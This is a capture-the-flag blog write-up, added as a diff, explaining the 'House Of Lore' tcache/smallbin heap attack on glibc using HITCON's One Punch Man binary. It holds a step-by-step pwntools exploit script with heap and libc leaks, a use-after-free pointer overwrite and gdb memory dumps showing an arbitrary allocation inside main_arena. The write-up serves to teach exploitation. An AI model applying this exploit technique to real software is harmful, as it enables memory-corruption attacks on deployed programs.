@@ -1,0 +1,319 @@
+I"�}<p>This attack was introduced for glibc &gt; 2.25 since the addition of tcache bins into glibc malloc.</p>
+
+<p><strong>PS</strong> - This attack is mostly based on Shellphish’s <a href="https://github.com/shellphish/how2heap">how2heap</a> implementation.</p>
+
+<p>I will be using Hitcon’s <em>One Punch Man</em> challenge to help you understand how this attack works.
+The writeup is a humble attempt to elaborate Shellphish’s implementation of <strong>House Of Lore</strong>.</p>
+
+<p class="notice"><strong>NOTE</strong> - This writeup is not the intended solution for the challenge involved. The detailed solution will be discussed in the next post :P:.</p>
+
+<h2 id="tldr-of-the-challenge-binary">TL;DR of the Challenge Binary</h2>
+
+<p>We have been given a standard CTF style <code class="language-plaintext highlighter-rouge">x86 64-bit Dynamically linked</code> binary to start with.
+<code class="language-plaintext highlighter-rouge">Checksec</code> shows pretty much every security measure enabled.</p>
+
+<h3 id="primitives-required-to-achieve-house-of-lore">Primitives Required to Achieve House Of Lore</h3>
+
+<ul>
+  <li>The well known <strong>Use After Free</strong> [both read and write].</li>
+  <li>Malloc and calloc both being called as per attacker request.</li>
+  <li>Double Free</li>
+  <li>Both libc and heap memory leaks.</li>
+</ul>
+
+<p>One fact that we leverage for our attack is that calloc calls dont take from tcache bins.</p>
+
+<p>Before we go any further , we need to analyze the source code of glibc malloc and get a cusp of what exactly all this is about.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cm">/*
+       If a small request, check regular bin.  Since these "smallbins"
+       hold one size each, no searching within bins is necessary.
+       (For a large request, we need to wait until unsorted chunks are
+       processed to find best fit. But for small ones, fits are exact
+       anyway, so we can check now, which is faster.)
+     */</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span><span class="p">(</span><span class="n">nb</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Get the index of the small bin</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span><span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+        <span class="c1">// Get the corresponding chunk pointer in the small bin</span>
+        <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+        <span class="c1">// First execute victim= last(bin) to get the last chunk of the small bin</span>
+        <span class="c1">// If victim = bin , then the bin is empty.</span>
+        <span class="c1">// If they are not equal, then there will be two cases</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span><span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// In the first case, the small bin has not yet been initialized.</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="cm">/* initialization check */</span>
+                <span class="c1">// Perform initialization to merge chunks in fast bins</span>
+                <span class="n">malloc_consolidate</span> <span class="p">(</span><span class="n">of</span><span class="p">);</span>
+            <span class="c1">// In the second case, there is a free chunk in the small bin</span>
+            <span class="k">else</span> <span class="p">{</span>
+                <span class="c1">// Get the second-to-last chunk in the small bin.</span>
+                <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+                <span class="c1">// Check if bck-&gt;fd is victim, prevent forgery</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span><span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="n">errstr</span> <span class="o">=</span> <span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">;</span>
+                    <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="c1">// Set the corresponding inuse bit of victim</span>
+                <span class="n">set_inuse_bit_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+                <span class="c1">// Modify the small bin list, take the last chunk of the small bin</span>
+                <span class="n">bin</span><span class="o">-&gt;</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+                <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
+                <span class="c1">// If it is not main_arena, set the corresponding flag</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span> <span class="n">set_non_main_arena</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+                <span class="c1">// Detailed inspection</span>
+                <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+                <span class="c1">// Convert the requested chunk to the corresponding mem state</span>
+                <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+                <span class="c1">// If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff</span>
+                <span class="n">alloc_perturb</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+                <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>What we’re actually interested is this part -&gt;</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Get the second-to-last chunk in the small bin.</span>
+                <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+                <span class="c1">// Check if bck-&gt;fd is victim, prevent forgery</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span><span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="n">errstr</span> <span class="o">=</span> <span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">;</span>
+                    <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="c1">// Set the corresponding inuse bit of victim</span>
+                <span class="n">set_inuse_bit_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+                <span class="c1">// Modify the small bin list, take the last chunk of the small bin</span>
+                <span class="n">bin</span><span class="o">-&gt;</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+                <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<p>If we can modify the <code class="language-plaintext highlighter-rouge">bck</code> of the last chunk of small bin with an address in such a way that we satisfy the corruption check , then we can successfully get an allocation in an arbitrary location.</p>
+
+<h2 id="reversing">Reversing</h2>
+
+<p>The binary is a standard Heap challenge binary with <code class="language-plaintext highlighter-rouge">Add</code>,<code class="language-plaintext highlighter-rouge">Edit</code>,<code class="language-plaintext highlighter-rouge">View</code> and <code class="language-plaintext highlighter-rouge">Delete</code> functionalities.</p>
+
+<p>I will not be discussing all the details of what these functions do as there will be a detailed writeup for describing everything eloquently.</p>
+
+<p>For now , I will just discuss what is needful for the attack to be triggered.</p>
+
+<ul>
+  <li>The add function does the calloc part , it can allocate chunks in range of sizes from [0x7f,0x400].</li>
+  <li>The free function has <strong>Use After Free</strong> as it does not null the pointer of the freed chunk.</li>
+  <li>The view function  views a chunk at requested idx.</li>
+  <li>The edit function safely edits a chunk at requested idx.</li>
+  <li>We have a secret function which can call malloc only when 0x220 tcache is filled with all 7 chunks of that size.</li>
+</ul>
+
+<p>Since we have <strong>UAF</strong> , we can edit free chunks also , hence we can <strong>Double Free</strong> by bypassing fd , bk checks in malloc.</p>
+
+<p>Now we have everything we need to perform <strong>House Of Lore</strong>.</p>
+
+<h2 id="exploit-development">Exploit Development</h2>
+
+<p>We can begin with creating wrapper functions which do necessary stuff for us.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./one_punch_loaded"</span><span class="p">,</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name: "</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">secret</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'50056'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Leaking both libc and heap should not require much explanation so I’ll go right away with that.</p>
+
+<p>We leak libc by viewing an unsorted bin chunk after filling up 0x220 tcache.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Add 2 chunks of 0x217
+</span><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">'1'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+
+<span class="c1">#Fill 0x217 tcache
+</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">'2'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">'2'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'3'</span><span class="o">*</span><span class="mh">0x1f0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Our aim is to send two chunks into the same size unsorted bins without coalescing. Hence we now send two chunks from different locations of heap so as to prevent merging and sending two separate chunks into unsorted bin and subsequently to the small bin thereafter</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#Chunk 2 also goes into unsorted bin
+</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#Chunk 1 also goes into unsorted bin
+</span>
+<span class="c1">#Heap
+</span><span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">)</span>
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span>  <span class="mh">0x1570</span>
+
+<span class="c1">#Libc
+</span><span class="n">view</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x219ca0</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+</code></pre></div></div>
+<p>From now on , it is better we have a look at the memory layout at each step for better understanding.
+For the sake of brevity , I will just show the dump of only few memory blocks of each chunk.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/6gx 0x555555559480-0x10
+0x555555559470:	0x0030303030303030	0x0000000000000221 -&gt; This is chunk 1 which we freed
+0x555555559480:	0x000055555555a570	0x00007ffff7fefca0
+0x555555559490:	0x3131313131313131	0x3131313131313131
+
+gdb-peda<span class="nv">$ </span>x/6gx 0x55555555a580-0x10
+0x55555555a570:	0x0032323232323232	0x0000000000000221 -&gt; This is chunk 2 
+0x55555555a580:	0x00007ffff7fefca0	0x0000555555559470
+0x55555555a590:	0x3232323232323232	0x3232323232323232
+
+</code></pre></div></div>
+
+<p>Also have a look at <code class="language-plaintext highlighter-rouge">main_arena</code></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0112| 0x7ffff7fefca0 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555a990 <span class="nt">--</span><span class="o">&gt;</span> 0x0  -&gt; Top Chunk
+0120| 0x7ffff7fefca8 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+0128| 0x7ffff7fefcb0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555559470 <span class="nt">--</span><span class="o">&gt;</span> 0x30303030303030 <span class="o">(</span><span class="s1">'0000000'</span><span class="o">)</span>  -&gt; Unsorted Bins , Chunk 1
+0136| 0x7ffff7fefcb8 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555a570 <span class="nt">--</span><span class="o">&gt;</span> 0x32323232323232 <span class="o">(</span><span class="s1">'2222222'</span><span class="o">)</span>  -&gt; Chunk 2
+
+</code></pre></div></div>
+
+<p>Now we send both unsorted bins to small bin.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'S'</span><span class="o">*</span><span class="mh">0x300</span><span class="p">)</span>
+</code></pre></div></div>
+<p>As u can see from below , both chunks have been added to small bin.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0648| 0x7ffff7fefeb8 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefea0 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe90 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe80 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe70 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe60 <span class="o">(</span><span class="nt">--</span><span class="o">&gt;</span> ...<span class="o">)</span>
+0656| 0x7ffff7fefec0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555559470 <span class="nt">--</span><span class="o">&gt;</span> 0x30303030303030 <span class="o">(</span><span class="s1">'0000000'</span><span class="o">)</span> -&gt; Chunk 1
+0664| 0x7ffff7fefec8 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555a570 <span class="nt">--</span><span class="o">&gt;</span> 0x32323232323232 <span class="o">(</span><span class="s1">'2222222'</span><span class="o">)</span> -&gt; Chunk 2
+</code></pre></div></div>
+
+<p>Now , we create space in tcache for triggering the vulnerability.</p>
+
+<p>Let us recollect that we now edit the <code class="language-plaintext highlighter-rouge">bk</code> pointer of our small bin chunk and then with a malloc , we can now send our small bin chunk to tcache.</p>
+
+<p>But first of all , to send our target chunk to tcache , we first need to make some place in tcache of 0x220 , so we malloc and consume one tcache.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Now we can edit the <code class="language-plaintext highlighter-rouge">bk</code> pointer of chunk 2. Note that here we intend to get an allocation on <code class="language-plaintext highlighter-rouge">main_arena</code> structure.</p>
+
+<p>Before editing , let us have a look at what we intend to do.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0640| 0x7ffff7fefeb0 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefea0 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe90 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe80 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe70 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe60 <span class="o">(</span><span class="nt">--</span><span class="o">&gt;</span> ...<span class="o">)</span>
+0648| 0x7ffff7fefeb8 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefea0 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe90 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe80 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe70 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7fefe60 <span class="o">(</span><span class="nt">--</span><span class="o">&gt;</span> ...<span class="o">)</span>
+0656| 0x7ffff7fefec0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555559470 <span class="nt">--</span><span class="o">&gt;</span> 0x30303030303030 <span class="o">(</span><span class="s1">'0000000'</span><span class="o">)</span>
+0664| 0x7ffff7fefec8 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555a570 <span class="nt">--</span><span class="o">&gt;</span> 0x32323232323232 <span class="o">(</span><span class="s1">'2222222'</span><span class="o">)</span> -&gt; we can easily pass corruption checks with this as our   new fake chunk , <span class="nb">let</span><span class="s1">'s call this the victim chunk :P.
+</span></code></pre></div></div>
+
+<p>Now we edit chunk 2’s <em>bk</em> ptr , note that we dont change the fd and keep it as it is.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">victim</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x219ec8</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">victim</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">victim</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span> <span class="c1">#Turns out that fd was victim-0x18, afterall it's all in the main_arena :)
+</span>
+</code></pre></div></div>
+
+<p>Let’s trigger our unsafe unlink and send our victim to tcache.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now see the magic.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/50gx 0x0000555555559000
+0x555555559000:	0x0000000000000000	0x0000000000000251
+0x555555559010:	0x0000000000000000	0x0000000000000000
+0x555555559020:	0x0000000000000000	0x0000000000000000
+0x555555559030:	0x0000000000000007	0x0000000000000000
+0x555555559040:	0x0000000000000000	0x0000000000000000
+0x555555559050:	0x0000000000000000	0x0000000000000000
+0x555555559060:	0x0000000000000000	0x0000000000000000
+0x555555559070:	0x0000000000000000	0x0000000000000000
+0x555555559080:	0x0000000000000000	0x0000000000000000
+0x555555559090:	0x0000000000000000	0x0000000000000000
+0x5555555590a0:	0x0000000000000000	0x0000000000000000
+0x5555555590b0:	0x0000000000000000	0x0000000000000000
+0x5555555590c0:	0x0000000000000000	0x0000000000000000
+0x5555555590d0:	0x0000000000000000	0x0000000000000000
+0x5555555590e0:	0x0000000000000000	0x0000000000000000
+0x5555555590f0:	0x0000000000000000	0x0000000000000000
+0x555555559100:	0x0000000000000000	0x0000000000000000
+0x555555559110:	0x0000000000000000	0x0000000000000000
+0x555555559120:	0x0000000000000000	0x0000000000000000
+0x555555559130:	0x0000000000000000	0x0000000000000000
+0x555555559140:	0x0000000000000000	0x0000000000000000
+0x555555559150:	0x00007ffff7fefec8	0x0000000000000000 -&gt; Our victim chunk landed on tcache
+</code></pre></div></div>
+
+<p>With yet another malloc call , we get our victim chunk back.
+The binary poses a constraint here , we can malloc only when the 0x220 tcache is filled.
+So let’s do that first and then call malloc.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">'T'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+<span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#Refill tcache
+</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">'P'</span><span class="o">*</span><span class="mh">0x300</span><span class="p">)</span> <span class="c1">#Padding chunk to prevent top consolidation
+</span></code></pre></div></div>
+
+<p>Finally call malloc and get victim.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'50056'</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>And Boom , malloc gives us our victim chunk back.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RAX: 0x7ffff7fefec8 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555a140 <span class="nt">--</span><span class="o">&gt;</span> 0x555555559f20 <span class="nt">--</span><span class="o">&gt;</span> 0x555555559d00 <span class="nt">--</span><span class="o">&gt;</span> 0x555555559ae0 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555598c0 <span class="o">(</span><span class="nt">--</span><span class="o">&gt;</span> ...<span class="o">)</span>
+
+</code></pre></div></div>
+<p>We can see the return value of malloc in <code class="language-plaintext highlighter-rouge">RAX</code> register , which is nothing but our victim chunk.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The idea was just to understand how House Of Lore works and it is not the intended solution for this challenge.
+On the other hand , to get control flow , we still have to ramble a little more to get things working in our favour.</p>
+
+<p class="notice">In the coming post , I will discuss how we can use House Of Lore twice and get <code class="language-plaintext highlighter-rouge">malloc_hook</code> allocated on tcache.</p>
+
+<h2 id="references">References</h2>
+
+<ol>
+  <li>Shellfish’s <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_stashing_unlink_attack.c">how2heap</a></li>
+  <li><a href="http://phrack.org/issues/67/8.html">Phrack</a></li>
+</ol>
+:ET
